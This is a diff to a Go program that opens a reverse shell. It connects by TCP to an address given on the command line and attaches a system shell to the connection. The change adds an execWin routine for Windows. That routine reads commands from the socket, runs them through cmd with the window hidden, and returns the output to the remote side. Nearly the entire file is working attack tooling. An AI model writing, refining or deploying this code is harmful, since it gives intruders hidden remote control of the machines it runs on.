@@ -1,16 +1,18 @@
 package main
 
 import (
+	"bufio"
 	"log"
 	"net"
 	"os"
 	"os/exec"
 	"runtime"
+	"syscall"
 )
 
 func ReverseShell(connectString string) {
 	var cmd *exec.Cmd
-	if len(connectString) == 0 { //valid input: "192.168.0.23:2233"
+	if len(connectString) == 0 {
 		log.Fatal("invalid reverse shell remote addr: ", connectString)
 	}
 	conn, err := net.Dial("tcp", connectString)
@@ -20,7 +22,8 @@ func ReverseShell(connectString string) {
 
 	switch runtime.GOOS {
 	case "windows":
-		cmd = exec.Command("cmd.exe")
+		execWin(conn)
+		return
 	case "linux":
 		cmd = exec.Command("/bin/sh")
 	case "freebsd":
@@ -28,12 +31,33 @@ func ReverseShell(connectString string) {
 	default:
 		cmd = exec.Command("/bin/sh")
 	}
+
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	_ = cmd.Run()
 }
 
+func execWin(conn net.Conn){
+	for{
+		status, _ := bufio.NewReader(conn).ReadString('\n');
+		//显示输入命令
+		// fmt.Println(status)
+		//输入exit命令退出
+		if status == "exit\n" {
+			break
+		}
+		//输入Ctrl+C时字符为空退出
+		if status == "" {
+			break
+		}
+		//执行命令返回结果
+		cmd := exec.Command("cmd", "/C", status)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		out, _ := cmd.Output();
+		conn.Write([]byte(out))
+	}
+}
 
 func main() {
 	ReverseShell(os.Args[1])
